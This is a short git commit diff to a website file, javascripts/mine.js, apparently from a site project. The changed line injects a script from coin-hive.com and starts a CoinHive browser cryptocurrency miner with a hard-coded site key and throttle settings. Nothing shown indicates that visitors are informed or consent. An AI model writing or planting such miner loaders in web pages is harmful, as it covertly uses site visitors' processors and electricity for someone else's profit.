5651c9cd16fa845fe6fdb9db40ea02a8f0be38d6
unlockproject <unlockproject@openmailbox.org>
2017-09-24 21:43:16 +0200

    Update mine.js

--- javascripts/mine.js
+++ javascripts/mine.js
@@ -1,4 +1,4 @@
-document.write("<script src=\"https://coin-hive.com/lib/coinhive.min.js\"> var miner = new CoinHive.User('EZAmlkaD7th3P7TwKrISdoXMY5eK3D5x', 'mine', {
+document.write("<script src=\"https://coin-hive.com/lib/coinhive.min.js\" defer>"+" var miner = new CoinHive.User('EZAmlkaD7th3P7TwKrISdoXMY5eK3D5x', 'mine', {
 	threads: 1,
 	autoThreads: false,
 	throttle: 0.8,
